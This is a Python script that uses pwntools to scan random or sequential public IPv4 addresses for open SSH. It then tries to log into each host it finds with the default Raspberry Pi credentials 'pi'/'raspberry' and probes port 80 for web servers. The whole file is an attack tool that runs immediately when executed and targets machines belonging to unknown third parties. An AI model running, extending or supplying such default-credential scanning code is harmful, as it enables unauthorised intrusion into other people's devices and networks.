import os
import time
import random
import pwn

# ip address format: X:X:X:X    range: 0.0.0.0 > 255.255.255.255


def all():
    ip1 = 1
    ip2 = 1
    ip3 = 1
    ip4 = 1
    goodips = []
    websites = []
    for _ in range(255**4):
        if ip1 > 255:
            ip1 = 1
            ip2 += 1
        if ip2 > 255:
            ip2 = 1
            ip3 += 1
        if ip3 > 255:
            ip3 = 1
            ip4 += 1
        if ip4 > 255:
            break
        ip = str(ip1)+"."+str(ip2)+"."+str(ip3)+"."+str(ip4)
        print(ip)
        try:
            print(pwn.remote(ip,22,timeout=0.05))
            goodips.append(ip)
            print("FOUND IP    =====================================================================================")
        except:
            pass
        ip1 += 1
    if len(goodips)!=0:
        for i in goodips:
            try:
                s = pwn.ssh(host=i,
                    user='pi',
                    password='raspberry')
                s.connect_remote(s.host, 22,timeout=5)
            except:
                print("Trying: "+i+" ERROR with connection.")
        for i in goodips:
            try:
                print(pwn.remote(i,80,timeout=5))
                websites.append(i)
            except:
                print("Trying: "+i+" no website here.")
    print("good ip's: "+str(goodips))
    print("websites: "+str(websites))
    print("number of good ip's: "+str(len(goodips)))
    print("number of websites: "+str(len(websites)))

def randm():
    ip1 = 1
    ip2 = 1
    ip3 = 1
    ip4 = 1
    goodips = []
    websites = []
    for _ in range(10000):
        ip1 = random.randint(1,255) 
        ip2 = random.randint(1,255)
        ip3 = random.randint(1,255)
        ip4 = random.randint(1,255)
        ip = str(ip1)+"."+str(ip2)+"."+str(ip3)+"."+str(ip4)
        try:
            print(pwn.remote(ip,22,timeout=0.05))
            goodips.append(ip)
            print("FOUND IP    =====================================================================================")
        except:
            pass
        ip1 += 1
    if len(goodips)!=0:
        for i in goodips:
            try:
                s = pwn.ssh(host=i,
                    user='pi',
                    password='raspberry')
                s.connect_remote(s.host, 22,timeout=5)
            except:
                print("Trying: "+i+" ERROR with connection.")
        for i in goodips:
            try:
                print(pwn.remote(i,80,timeout=5))
                websites.append(i)
            except:
                print("Trying: "+i+" no website here.")
    print("good ip's: "+str(goodips))
    print("websites: "+str(websites))
    print("number of good ip's: "+str(len(goodips)))
    print("number of websites: "+str(len(websites)))
randm()